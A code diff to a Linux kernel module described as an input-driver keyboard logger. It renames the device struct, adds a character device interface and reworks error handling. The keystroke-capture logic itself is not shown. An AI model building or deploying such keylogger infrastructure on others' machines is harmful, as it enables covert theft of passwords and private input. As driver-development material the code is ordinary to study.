@@ -47,29 +47,46 @@ MODULE_DESCRIPTION("Input driver keyboard logger");
 
 const char *kbdstr = "keyboard";
 
-struct klogdev {
+struct kbldev {
 	struct input_handle handle;
 	struct device dev;
-};
-
-static const struct file_operations kldev_fops = {
-	.owner    = THIS_MODULE,
+	struct cdev cdev;
 };
 
 
-static void klogdev_free(struct device *dev)
+static int kbldev_release(struct inode *inode, struct file *file)
 {
-	struct klogdev *kldev = container_of(dev, struct klogdev, dev);
-
-	input_put_device(kldev->handle.dev);
-	kfree(kldev);
+	return 0;
 }
 
-static void kbdlogger_cleanup(struct klogdev *kldev)
+
+static int kbldev_open(struct inode *inode, struct file *file)
 {
-	struct input_handle *handle = &kldev->handle;
-	if (!kldev)
+	return 0;
+}
+
+static const struct file_operations kbldev_fops = {
+	.owner    = THIS_MODULE,
+	.open     = kbldev_open,
+	.release  = kbldev_release,
+};
+
+
+static void kbldev_free(struct device *dev)
+{
+	struct kbldev *kbldev = container_of(dev, struct kbldev, dev);
+
+	input_put_device(kbldev->handle.dev);
+	kfree(kbldev);
+}
+
+static void kbdlogger_cleanup(struct kbldev *kbldev)
+{
+	struct input_handle *handle = &kbldev->handle;
+	if (!kbldev)
 		return;
+
+	cdev_del(&kbldev->cdev);
 
 	if (handle)
 		input_close_device(handle);
@@ -83,7 +100,7 @@ static int kbdlogger_connect(struct input_handler *handler,
 	int error;
 	int minor;
 	int dev_no;
-	struct klogdev *kldev;
+	struct kbldev *kbldev;
 
 	/* if the device is not a keyboard it is filtered out. */
 	if (!strstr(dev->name, kbdstr))
@@ -96,8 +113,8 @@ static int kbdlogger_connect(struct input_handler *handler,
 		return error;
 	}
 
-	kldev = kzalloc(sizeof(struct klogdev), GFP_KERNEL);
-	if (!kldev) {
+	kbldev = kzalloc(sizeof(struct kbldev), GFP_KERNEL);
+	if (!kbldev) {
 		error = -ENOMEM;
 		goto err_free_minor;
 	}
@@ -106,44 +123,52 @@ static int kbdlogger_connect(struct input_handler *handler,
 	/* Normalize device number if it falls into legacy range */
 	if (dev_no < EVDEV_MINOR_BASE + EVDEV_MINORS)
 		dev_no -= EVDEV_MINOR_BASE;
-	dev_set_name(&kldev->dev, "event%d", dev_no);
+	dev_set_name(&kbldev->dev, "event%d", dev_no);
 
-	kldev->handle.dev = input_get_device(dev);  /* input_dev */
-	kldev->handle.name = dev_name(&kldev->dev);
-	kldev->handle.handler = handler;
-	kldev->handle.private = kldev;
+	kbldev->handle.dev = input_get_device(dev);  /* input_dev */
+	kbldev->handle.name = dev_name(&kbldev->dev);
+	kbldev->handle.handler = handler;
+	kbldev->handle.private = kbldev;
 
-	kldev->dev.devt = MKDEV(INPUT_MAJOR, minor);
-	kldev->dev.class = &input_class;
-	kldev->dev.parent = &dev->dev; /* &(input_dev)->dev */
-	kldev->dev.release = klogdev_free;
-	device_initialize(&kldev->dev);
+	kbldev->dev.devt = MKDEV(INPUT_MAJOR, minor);
+	kbldev->dev.class = &input_class;
+	kbldev->dev.parent = &dev->dev; /* &(input_dev)->dev */
+	kbldev->dev.release = kbldev_free;
+	device_initialize(&kbldev->dev);
 
-	error = input_register_handle(&kldev->handle);
+	error = input_register_handle(&kbldev->handle);
 	if (error)
-		goto err_free_kldev;
+		goto err_free_kbldev;
 
-	error = device_add(&kldev->dev);
+	cdev_init(&kbldev->cdev, &kbldev_fops);
+	kbldev->cdev.kobj.parent = &kbldev->dev.kobj;
+	error = cdev_add(&kbldev->cdev, kbldev->dev.devt, 1);
 	if (error)
-		goto err_cleanup_kldev;
+		goto err_unregister_handle;
 
-	error = input_open_device(&kldev->handle);
+	error = device_add(&kbldev->dev);
 	if (error)
-		goto err_cleanup_kldev;
+		goto err_cleanup_kbldev;
 
-	pr_info("Connected device: %s (%s at %s)\n",
+	error = input_open_device(&kbldev->handle);
+	if (error)
+		goto err_cleanup_kbldev;
+
+	pr_info("Added device %s\n", dev_name(&kbldev->dev));
+
+	pr_info("Connected to device %s (%s at %s)\n",
 		dev_name(&dev->dev),
 		dev->name ?: "unknown",
 		dev->phys ?: "unknown");
 
 	return 0;
 
-err_cleanup_kldev:
-	kbdlogger_cleanup(kldev);
-//err_unregister_handle:
-	input_unregister_handle(&kldev->handle);
-err_free_kldev:
-	put_device(&kldev->dev);
+err_cleanup_kbldev:
+	kbdlogger_cleanup(kbldev);
+err_unregister_handle:
+	input_unregister_handle(&kbldev->handle);
+err_free_kbldev:
+	put_device(&kbldev->dev);
 err_free_minor:
 	input_free_minor(minor);
 	return error;
@@ -160,20 +185,20 @@ static void kbdlogger_event(struct input_handle *handle, unsigned int type,
 
 static void kbdlogger_disconnect(struct input_handle *handle)
 {
-	struct klogdev *kldev = handle->private;
+	struct kbldev *kbldev = handle->private;
 
-	device_del(&kldev->dev);
-	pr_info("Disconnected device: %s\n", dev_name(&handle->dev->dev));
-	kbdlogger_cleanup(kldev);
+	device_del(&kbldev->dev);
+	kbdlogger_cleanup(kbldev);
 
-	input_free_minor(MINOR(kldev->dev.devt));
+	input_free_minor(MINOR(kbldev->dev.devt));
 
 	if (handle)
 		input_unregister_handle(handle);
 	else
 		pr_err("input handle already NULL\n");
 
-	put_device(&kldev->dev);
+	put_device(&kbldev->dev);
+	pr_info("Disconnected from device %s\n", dev_name(&handle->dev->dev));
 }
 
 static const struct input_device_id kbdlogger_ids[] = {
@@ -202,7 +227,7 @@ static int __init kbdlogger_init(void)
 		goto fail;
 	}
 
-	pr_info("loaded\n");
+	pr_info("loaded %s\n", DEVNAME);
 	return 0;
 fail:
 	pr_err("failed to init %s\n", DEVNAME);
@@ -212,7 +237,7 @@ fail:
 static void __exit kbdlogger_exit(void)
 {
 	input_unregister_handler(&kbdlogger_handler);
-	pr_info("exited\n");
+	pr_info("unloaded %s\n", DEVNAME);
 }
 
 module_init(kbdlogger_init);
